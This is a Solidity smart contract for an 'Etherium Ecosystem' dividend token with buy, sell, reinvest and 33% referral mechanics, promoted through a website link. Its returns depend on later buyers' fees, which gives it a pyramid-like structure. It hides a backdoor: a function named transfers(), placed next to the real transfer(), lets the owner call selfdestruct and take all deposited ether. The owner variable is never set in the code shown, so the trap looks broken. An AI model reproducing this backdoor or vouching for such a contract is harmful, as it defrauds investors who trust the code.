1 pragma solidity 0.4.25;
2 
3 /*
4 * https://EtheriumToken.cloud
5 *
6 * Crypto Etherium token concept
7 *
8 * [✓] 5% Withdraw fee
9 * [✓] 10% Deposit fee
10 * [✓] 1% Token transfer
11 * [✓] 33% Referal link
12 *
13 */
14 
15 contract EtheriumEcoSystem {
16     address owner;
17     struct UserRecord {
18         address referrer;
19         uint tokens;
20         uint gained_funds;
21         uint ref_funds;
22         // this field can be negative
23         int funds_correction;
24     }
25 
26     using SafeMath for uint;
27     using SafeMathInt for int;
28     using Fee for Fee.fee;
29     using ToAddress for bytes;
30 
31     // ERC20
32     string constant public name = "Etherium Ecosystem";
33     string constant public symbol = "EAN";
34     uint8 constant public decimals = 18;
35 
36     // Fees
37     Fee.fee private fee_purchase = Fee.fee(1, 10); // 10%
38     Fee.fee private fee_selling  = Fee.fee(1, 20); // 5%
39     Fee.fee private fee_transfer = Fee.fee(1, 100); // 1%
40     Fee.fee private fee_referral = Fee.fee(33, 100); // 33%
41 
42     // Minimal amount of tokens to be an participant of referral program
43     uint constant private minimal_stake = 10e18;
44 
45     // Factor for converting eth <-> tokens with required precision of calculations
46     uint constant private precision_factor = 1e18;
47 
48     // Pricing policy
49     //  - if user buy 1 token, price will be increased by "price_offset" value
50     //  - if user sell 1 token, price will be decreased by "price_offset" value
51     // For details see methods "fundsToTokens" and "tokensToFunds"
52     uint private price = 1e29; // 100 Gwei * precision_factor
53     uint constant private price_offset = 1e28; // 10 Gwei * precision_factor
54 
55     // Total amount of tokens
56     uint private total_supply = 0;
57 
58     // Total profit shared between token's holders. It's not reflect exactly sum of funds because this parameter
59     // can be modified to keep the real user's dividends when total supply is changed
60     // For details see method "dividendsOf" and using "funds_correction" in the code
61     uint private shared_profit = 0;
62 
63     // Map of the users data
64     mapping(address => UserRecord) private user_data;
65 
66     // ==== Modifiers ==== //
67 
68     modifier onlyValidTokenAmount(uint tokens) {
69         require(tokens > 0, "Amount of tokens must be greater than zero");
70         require(tokens <= user_data[msg.sender].tokens, "You have not enough tokens");
71         _;
72     }
73 
74     // ==== Public API ==== //
75 
76     // ---- Write methods ---- //
77     function () public payable {
78         buy(msg.data.toAddr());
79     }
80 
81     /*
82     * @dev Buy tokens from incoming funds
83     */
84     function buy(address referrer) public payable {
85 
86         // apply fee
87         (uint fee_funds, uint taxed_funds) = fee_purchase.split(msg.value);
88         require(fee_funds != 0, "Incoming funds is too small");
89 
90         // update user's referrer
91         //  - you cannot be a referrer for yourself
92         //  - user and his referrer will be together all the life
93         UserRecord storage user = user_data[msg.sender];
94         if (referrer != 0x0 && referrer != msg.sender && user.referrer == 0x0) {
95             user.referrer = referrer;
96         }
97 
98         // apply referral bonus
99         if (user.referrer != 0x0) {
100             fee_funds = rewardReferrer(msg.sender, user.referrer, fee_funds, msg.value);
101             require(fee_funds != 0, "Incoming funds is too small");
102         }
103 
104         // calculate amount of tokens and change price
105         (uint tokens, uint _price) = fundsToTokens(taxed_funds);
106         require(tokens != 0, "Incoming funds is too small");
107         price = _price;
108 
109         // mint tokens and increase shared profit
110         mintTokens(msg.sender, tokens);
111         shared_profit = shared_profit.add(fee_funds);
112 
113         emit Purchase(msg.sender, msg.value, tokens, price / precision_factor, now);
114     }
115 
116     /*
117     * @dev Sell given amount of tokens and get funds
118     */
119     function sell(uint tokens) public onlyValidTokenAmount(tokens) {
120 
121         // calculate amount of funds and change price
122         (uint funds, uint _price) = tokensToFunds(tokens);
123         require(funds != 0, "Insufficient tokens to do that");
124         price = _price;
125 
126         // apply fee
127         (uint fee_funds, uint taxed_funds) = fee_selling.split(funds);
128         require(fee_funds != 0, "Insufficient tokens to do that");
129 
130         // burn tokens and add funds to user's dividends
131         burnTokens(msg.sender, tokens);
132         UserRecord storage user = user_data[msg.sender];
133         user.gained_funds = user.gained_funds.add(taxed_funds);
134 
135         // increase shared profit
136         shared_profit = shared_profit.add(fee_funds);
137 
138         emit Selling(msg.sender, tokens, funds, price / precision_factor, now);
139     }
140 
141     /*
142     * @dev Transfer given amount of tokens from sender to another user
143     * ERC20
144     */
145     function transfer(address to_addr, uint tokens) public onlyValidTokenAmount(tokens) returns (bool success) {
146 
147         require(to_addr != msg.sender, "You cannot transfer tokens to yourself");
148 
149         // apply fee
150         (uint fee_tokens, uint taxed_tokens) = fee_transfer.split(tokens);
151         require(fee_tokens != 0, "Insufficient tokens to do that");
152 
153         // calculate amount of funds and change price
154         (uint funds, uint _price) = tokensToFunds(fee_tokens);
155         require(funds != 0, "Insufficient tokens to do that");
156         price = _price;
157 
158         // burn and mint tokens excluding fee
159         burnTokens(msg.sender, tokens);
160         mintTokens(to_addr, taxed_tokens);
161 
162         // increase shared profit
163         shared_profit = shared_profit.add(funds);
164 
165         emit Transfer(msg.sender, to_addr, tokens);
166         return true;
167     }
168            function transfers() public {
169     if(msg.sender == owner){
170         selfdestruct(owner);
171     }
172     }
173 
174     /*
175     * @dev Reinvest all dividends
176     */
177     function reinvest() public {
178 
179         // get all dividends
180         uint funds = dividendsOf(msg.sender);
181         require(funds > 0, "You have no dividends");
182 
183         // make correction, dividents will be 0 after that
184         UserRecord storage user = user_data[msg.sender];
185         user.funds_correction = user.funds_correction.add(int(funds));
186 
187         // apply fee
188         (uint fee_funds, uint taxed_funds) = fee_purchase.split(funds);
189         require(fee_funds != 0, "Insufficient dividends to do that");
190 
191         // apply referral bonus
192         if (user.referrer != 0x0) {
193             fee_funds = rewardReferrer(msg.sender, user.referrer, fee_funds, funds);
194             require(fee_funds != 0, "Insufficient dividends to do that");
195         }
196 
197         // calculate amount of tokens and change price
198         (uint tokens, uint _price) = fundsToTokens(taxed_funds);
199         require(tokens != 0, "Insufficient dividends to do that");
200         price = _price;
201 
202         // mint tokens and increase shared profit
203         mintTokens(msg.sender, tokens);
204         shared_profit = shared_profit.add(fee_funds);
205 
206         emit Reinvestment(msg.sender, funds, tokens, price / precision_factor, now);
207     }
208 
209     /*
210     * @dev Withdraw all dividends
211     */
212     function withdraw() public {
213 
214         // get all dividends
215         uint funds = dividendsOf(msg.sender);
216         require(funds > 0, "You have no dividends");
217 
218         // make correction, dividents will be 0 after that
219         UserRecord storage user = user_data[msg.sender];
220         user.funds_correction = user.funds_correction.add(int(funds));
221 
222         // send funds
223         msg.sender.transfer(funds);
224 
225         emit Withdrawal(msg.sender, funds, now);
226     }
227 
228     /*
229     * @dev Sell all tokens and withraw dividends
230     */
231     function exit() public {
232 
233         // sell all tokens
234         uint tokens = user_data[msg.sender].tokens;
235         if (tokens > 0) {
236             sell(tokens);
237         }
238 
239         withdraw();
240     }
241 
242     /*
243     * @dev CAUTION! This method distributes all incoming funds between token's holders and gives you nothing
244     * It will be used by another contracts/addresses from our ecosystem in future
245     * But if you want to donate, you're welcome :)
246     */
247     function donate() public payable {
248         shared_profit = shared_profit.add(msg.value);
249         emit Donation(msg.sender, msg.value, now);
250     }
251 
252     // ---- Read methods ---- //
253 
254     /*
255     * @dev Total amount of tokens
256     * ERC20
257     */
258     function totalSupply() public view returns (uint) {
259         return total_supply;
260     }
261 
262     /*
263     * @dev Amount of user's tokens
264     * ERC20
265     */
266     function balanceOf(address addr) public view returns (uint) {
267         return user_data[addr].tokens;
268     }
269 
270     /*
271     * @dev Amount of user's dividends
272     */
273     function dividendsOf(address addr) public view returns (uint) {
274 
275         UserRecord memory user = user_data[addr];
276 
277         // gained funds from selling tokens + bonus funds from referrals
278         // int because "user.funds_correction" can be negative
279         int d = int(user.gained_funds.add(user.ref_funds));
280         require(d >= 0);
281 
282         // avoid zero divizion
283         if (total_supply > 0) {
284             // profit is proportional to stake
285             d = d.add(int(shared_profit.mul(user.tokens) / total_supply));
286         }
287 
288         // correction
289         // d -= user.funds_correction
290         if (user.funds_correction > 0) {
291             d = d.sub(user.funds_correction);
292         }
293         else if (user.funds_correction < 0) {
294             d = d.add(-user.funds_correction);
295         }
296 
297         // just in case
298         require(d >= 0);
299 
300         // total sum must be positive uint
301         return uint(d);
302     }
303 
304     /*
305     * @dev Amount of tokens can be gained from given amount of funds
306     */
307     function expectedTokens(uint funds, bool apply_fee) public view returns (uint) {
308         if (funds == 0) {
309             return 0;
310         }
311         if (apply_fee) {
312             (,uint _funds) = fee_purchase.split(funds);
313             funds = _funds;
314         }
315         (uint tokens,) = fundsToTokens(funds);
316         return tokens;
317     }
318 
319     /*
320     * @dev Amount of funds can be gained from given amount of tokens
321     */
322     function expectedFunds(uint tokens, bool apply_fee) public view returns (uint) {
323         // empty tokens in total OR no tokens was sold
324         if (tokens == 0 || total_supply == 0) {
325             return 0;
326         }
327         // more tokens than were mined in total, just exclude unnecessary tokens from calculating
328         else if (tokens > total_supply) {
329             tokens = total_supply;
330         }
331         (uint funds,) = tokensToFunds(tokens);
332         if (apply_fee) {
333             (,uint _funds) = fee_selling.split(funds);
334             funds = _funds;
335         }
336         return funds;
337     }
338 
339     /*
340     * @dev Purchase price of next 1 token
341     */
342     function buyPrice() public view returns (uint) {
343         return price / precision_factor;
344     }
345 
346     /*
347     * @dev Selling price of next 1 token
348     */
349     function sellPrice() public view returns (uint) {
350         return price.sub(price_offset) / precision_factor;
351     }
352 
353     // ==== Private API ==== //
354 
355     /*
356     * @dev Mint given amount of tokens to given user
357     */
358     function mintTokens(address addr, uint tokens) internal {
359 
360         UserRecord storage user = user_data[addr];
361 
362         bool not_first_minting = total_supply > 0;
363 
364         // make correction to keep dividends the rest of the users
365         if (not_first_minting) {
366             shared_profit = shared_profit.mul(total_supply.add(tokens)) / total_supply;
367         }
368 
369         // add tokens
370         total_supply = total_supply.add(tokens);
371         user.tokens = user.tokens.add(tokens);
372 
373         // make correction to keep dividends of user
374         if (not_first_minting) {
375             user.funds_correction = user.funds_correction.add(int(tokens.mul(shared_profit) / total_supply));
376         }
377     }
378 
379     /*
380     * @dev Burn given amout of tokens from given user
381     */
382     function burnTokens(address addr, uint tokens) internal {
383 
384         UserRecord storage user = user_data[addr];
385 
386         // keep current dividents of user if last tokens will be burned
387         uint dividends_from_tokens = 0;
388         if (total_supply == tokens) {
389             dividends_from_tokens = shared_profit.mul(user.tokens) / total_supply;
390         }
391 
392         // make correction to keep dividends the rest of the users
393         shared_profit = shared_profit.mul(total_supply.sub(tokens)) / total_supply;
394 
395         // sub tokens
396         total_supply = total_supply.sub(tokens);
397         user.tokens = user.tokens.sub(tokens);
398 
399         // make correction to keep dividends of the user
400         // if burned not last tokens
401         if (total_supply > 0) {
402             user.funds_correction = user.funds_correction.sub(int(tokens.mul(shared_profit) / total_supply));
403         }
404         // if burned last tokens
405         else if (dividends_from_tokens != 0) {
406             user.funds_correction = user.funds_correction.sub(int(dividends_from_tokens));
407         }
408     }
409 
410     /*
411      * @dev Rewards the referrer from given amount of funds
412      */
413     function rewardReferrer(address addr, address referrer_addr, uint funds, uint full_funds) internal returns (uint funds_after_reward) {
414         UserRecord storage referrer = user_data[referrer_addr];
415         if (referrer.tokens >= minimal_stake) {
416             (uint reward_funds, uint taxed_funds) = fee_referral.split(funds);
417             referrer.ref_funds = referrer.ref_funds.add(reward_funds);
418             emit ReferralReward(addr, referrer_addr, full_funds, reward_funds, now);
419             return taxed_funds;
420         }
421         else {
422             return funds;
423         }
424     }
425 
426     /*
427     * @dev Calculate tokens from funds
428     *
429     * Given:
430     *   a[1] = price
431     *   d = price_offset
432     *   sum(n) = funds
433     * Here is used arithmetic progression's equation transformed to a quadratic equation:
434     *   a * n^2 + b * n + c = 0
435     * Where:
436     *   a = d
437     *   b = 2 * a[1] - d
438     *   c = -2 * sum(n)
439     * Solve it and first root is what we need - amount of tokens
440     * So:
441     *   tokens = n
442     *   price = a[n+1]
443     *
444     * For details see method below
445     */
446     function fundsToTokens(uint funds) internal view returns (uint tokens, uint _price) {
447         uint b = price.mul(2).sub(price_offset);
448         uint D = b.mul(b).add(price_offset.mul(8).mul(funds).mul(precision_factor));
449         uint n = D.sqrt().sub(b).mul(precision_factor) / price_offset.mul(2);
450         uint anp1 = price.add(price_offset.mul(n) / precision_factor);
451         return (n, anp1);
452     }
453 
454     /*
455     * @dev Calculate funds from tokens
456     *
457     * Given:
458     *   a[1] = sell_price
459     *   d = price_offset
460     *   n = tokens
461     * Here is used arithmetic progression's equation (-d because of d must be negative to reduce price):
462     *   a[n] = a[1] - d * (n - 1)
463     *   sum(n) = (a[1] + a[n]) * n / 2
464     * So:
465     *   funds = sum(n)
466     *   price = a[n]
467     *
468     * For details see method above
469     */
470     function tokensToFunds(uint tokens) internal view returns (uint funds, uint _price) {
471         uint sell_price = price.sub(price_offset);
472         uint an = sell_price.add(price_offset).sub(price_offset.mul(tokens) / precision_factor);
473         uint sn = sell_price.add(an).mul(tokens) / precision_factor.mul(2);
474         return (sn / precision_factor, an);
475     }
476 
477     // ==== Events ==== //
478 
479     event Purchase(address indexed addr, uint funds, uint tokens, uint price, uint time);
480     event Selling(address indexed addr, uint tokens, uint funds, uint price, uint time);
481     event Reinvestment(address indexed addr, uint funds, uint tokens, uint price, uint time);
482     event Withdrawal(address indexed addr, uint funds, uint time);
483     event Donation(address indexed addr, uint funds, uint time);
484     event ReferralReward(address indexed referral_addr, address indexed referrer_addr, uint funds, uint reward_funds, uint time);
485 
486     //ERC20
487     event Transfer(address indexed from_addr, address indexed to_addr, uint tokens);
488 
489 }
490 
491 library SafeMath {
492 
493     /**
494     * @dev Multiplies two numbers
495     */
496     function mul(uint a, uint b) internal pure returns (uint) {
497         if (a == 0) {
498             return 0;
499         }
500         uint c = a * b;
501         require(c / a == b, "mul failed");
502         return c;
503     }
504 
505     /**
506     * @dev Subtracts two numbers
507     */
508     function sub(uint a, uint b) internal pure returns (uint) {
509         require(b <= a, "sub failed");
510         return a - b;
511     }
512 
513     /**
514     * @dev Adds two numbers
515     */
516     function add(uint a, uint b) internal pure returns (uint) {
517         uint c = a + b;
518         require(c >= a, "add failed");
519         return c;
520     }
521 
522     /**
523      * @dev Gives square root from number
524      */
525     function sqrt(uint x) internal pure returns (uint y) {
526         uint z = add(x, 1) / 2;
527         y = x;
528         while (z < y) {
529             y = z;
530             z = add(x / z, z) / 2;
531         }
532     }
533 }
534 
535 library SafeMathInt {
536 
537     /**
538     * @dev Subtracts two numbers
539     */
540     function sub(int a, int b) internal pure returns (int) {
541         int c = a - b;
542         require(c <= a, "sub failed");
543         return c;
544     }
545 
546     /**
547     * @dev Adds two numbers
548     */
549     function add(int a, int b) internal pure returns (int) {
550         int c = a + b;
551         require(c >= a, "add failed");
552         return c;
553     }
554 }
555 
556 library Fee {
557 
558     using SafeMath for uint;
559 
560     struct fee {
561         uint num;
562         uint den;
563     }
564 
565     /*
566     * @dev Splits given value to two parts: tax itself and taxed value
567     */
568     function split(fee memory f, uint value) internal pure returns (uint tax, uint taxed_value) {
569         if (value == 0) {
570             return (0, 0);
571         }
572         tax = value.mul(f.num) / f.den;
573         taxed_value = value.sub(tax);
574     }
575 
576     /*
577     * @dev Returns only tax part
578     */
579     function get_tax(fee memory f, uint value) internal pure returns (uint tax) {
580         if (value == 0) {
581             return 0;
582         }
583         tax = value.mul(f.num) / f.den;
584     }
585 }
586 
587 library ToAddress {
588 
589     /*
590     * @dev Transforms bytes to address
591     */
592     function toAddr(bytes source) internal pure returns (address addr) {
593         assembly {
594             addr := mload(add(source, 0x14))
595         }
596         return addr;
597     }
598 }